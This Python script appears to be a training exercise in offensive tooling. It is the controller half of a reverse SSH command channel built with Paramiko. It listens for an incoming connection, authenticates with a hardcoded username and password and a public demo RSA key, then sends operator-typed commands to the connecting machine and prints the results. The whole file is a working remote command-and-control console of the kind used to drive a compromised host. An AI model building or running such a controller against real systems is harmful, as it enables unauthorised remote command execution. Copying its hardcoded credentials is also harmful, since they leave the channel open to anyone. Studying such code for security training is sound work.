# To be used paired with bh_sshRcmd.py
# NOTE: this is used to emulate the ssh server on Windows and here the roles
# of the client and the server are reversed: the server is the one who sends the
# command to the client

import socket
import paramiko
import threading
import sys
import argparse

class Server(paramiko.ServerInterface):

	def __init__(self):

		self.event = threading.Event()

	def check_channel_request(self, kind, channelID):

		if kind == "session":
			return paramiko.OPEN_SUCCEEDED
		else:
			return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED

	def check_auth_password(self, username, password):

		if (username == "justin") and (password == "lovesthepython"):
                        return paramiko.AUTH_SUCCESSFUL
		else:
			return paramiko.AUTH_FAILED


if __name__ == "__main__":

	# Using the key from the Paramiko demo files: github.com/paramiko/paramiko/blob/master/tests/test_rsa.key
	host_key = paramiko.RSAKey(filename = "./test_rsa.key")

	parser = argparse.ArgumentParser()
	parser.add_argument("host_address", default = "127.0.0.1", help = "IP address of the SSH server")
	parser.add_argument("host_port", type = int, default = 22, help = "Used port of the SSH server")

	args = parser.parse_args()

	try:
		server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
		server_socket.bind((args.host_address, args.host_port))

		server_socket.listen(5)
		print("[+] Listen for connection ...")
		(client, client_addr) = server_socket.accept()

	except Exception as listenFailure:
		print("[-] Listen failed: " + str(listenFailure))
		sys.exit(1)

	print("[+] Got a connection!")

	try:
		bhSession = paramiko.Transport(client)
		bhSession.add_server_key(host_key)
		server = Server()

		try:
			bhSession.start_server(server = server)
		except paramiko.SSHException as sshServerException:
			print("[-] SSH negotiation failed.")

		chan = bhSession.accept(20)
		print("[+] Authenticad!")
		print(chan.recv(1024))
		chan.send("Welcome to bh_ssh".encode())

		while True:
			try:
				command = input("Enter command: ").strip("\n")

				if command != "exit":
					chan.send(command.encode())
					print(chan.recv(1024).decode() + "\n")
				else:
					chan.send("exit".encode())
					print("exiting")
					bhSession.close()
					raise Exception("exit")
			except KeyboardInterrupt:
				bhSession.close()

	except Exception as caughtException:
		print("[-] Caught exception: " + str(caughtException))

		try:
			bhSession.close()
		finally:
			sys.exit(1)
